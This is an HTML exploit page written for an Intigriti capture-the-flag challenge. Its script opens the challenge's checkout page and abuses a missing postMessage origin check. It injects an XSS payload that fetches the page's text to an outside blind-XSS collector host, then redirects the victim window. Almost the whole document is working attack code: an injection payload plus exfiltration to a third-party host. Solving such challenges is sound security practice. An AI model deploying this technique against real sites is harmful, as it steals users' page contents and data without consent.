<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Intigriti Challenge Exploit</title>
</head>
<body>
    <h1>ðŸš€ Launching Exploit...</h1>
    <p>Please wait while we capture the flag.</p>

    <script>
        // CONFIGURATION
        const BASE_URL = 'https://challenge-0126.intigriti.io';
        const BXSS_URL = 'https://monkeydluffy.bxss.in';
        
        // 1. Open the vulnerable Checkout page
        // We open it in a new window so we can control it via a reference
        let targetWindow = window.open(BASE_URL + '/checkout.html?currency=1337COIN&price=1', '_blank');

        // 2. Wait for the checkout page to fully load
        setTimeout(() => {
            
            // THE PAYLOAD
            // -------------------------------------------------------------------
            // Break out of the title attribute: ">
            // Inject img tag with onerror event
            // Fetch your bxss URL with the page content (which contains the flag)
            // -------------------------------------------------------------------
            const xss_payload = `"><img src=x onerror="fetch('${BXSS_URL}?flag='+encodeURIComponent(document.body.innerText))">`;

            // 3. Send the malicious postMessage
            // This exploits the missing origin check in checkout.html
            targetWindow.postMessage({
                type: 'submitTransaction',
                transaction: {
                    currency: 'BTC',         // Must match a wallet the bot owns
                    amount: 0.00001337,      // Arbitrary amount
                    toAddress: xss_payload   // The exploit injection
                }
            }, '*'); // '*' allows sending to any origin (essential for the exploit)

            // 4. Redirect the victim to MarketWatch
            // We wait 1.5 seconds to ensure the API call in step 3 finished
            setTimeout(() => {
                targetWindow.location = BASE_URL + '/marketwatch.html';
            }, 1500);

        }, 2000); // Initial wait time for window to open
    </script>
</body>
</html>
